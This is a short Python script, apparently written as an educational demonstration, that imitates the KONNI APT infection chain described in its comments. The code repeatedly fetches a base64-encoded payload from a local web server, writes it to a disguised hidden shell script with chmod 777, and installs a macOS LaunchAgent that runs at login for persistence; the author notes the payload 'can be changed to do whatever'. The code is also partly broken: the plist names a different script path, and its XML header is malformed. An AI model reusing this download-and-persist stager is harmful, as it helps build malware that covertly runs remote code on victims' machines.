#Inofmration and initial analysis taken from https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/blob/master/2022/2022.01.03.KONNI_Targets_Russian_Diplomatic/Konni_targeting_Russian_diplomatic_sector.pdf
#Creating the malicious archive: https://www.youtube.com/watch?v=9QF3SS60rJ4

"""
Per the above linked article, the infection process has multiple stages, begining with an email containg a malicious attachment.

The attachment is a .zip file, and upon being decompressed it drops a malicious Windows screensaver file (.scr -> https://docs.fileformat.com/system/scr/) that drops an image under the %TEMP% folder and opens that same image up in the foreground.
In the background however, the malware begins the next stage of the attack by downloading the next payload from a C2 server. 
Then executes this file which further compromises the system by installing a variant of the Koni RAT.
"""

"""
This code is much simplier than the malware mentioned, but gives a general demonstration behind the process of utilizing a webserver to repsond with a b64 encoded string, decode this to a file, and then execute it for persistence.
In this case, I altered the payload to just run the `hostname` command, however it can be changed to do whatever.  Also, this has been changed to get persistence on a Mac-based platform through Launch Agents instead of the Windows .dll method.
"""


import base64
import requests
import subprocess
import os.path
import time

while not os.path.exists("~/.legitscript.sh"):
    r = requests.get("http://127.0.0.1:5000/notmalware")
    script = base64.b64decode(r.text)
    with open("~/.legitscript.sh","wb") as f:
        f.write(script)
        subprocess.run(["chmod", "777", "~/.legitscript.sh"])
        f.close()
    time.sleep(5)
    
data = """
<?xml version="1.0" encoding="UTF-8"?
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.company.app.plist</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>PATH</key>
<string><![CDATA[/usr/local/bin:/usr/local/sbin:/usr/bin:/bin:/usr/sbin:/sbin]]>
</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/usr/local/bin/notmalware.sh</string>
</array>
</dict>
</plist>
"""

with open("~/Library/LaunchAgents/test.plist","w") as f:
    f.write(data)
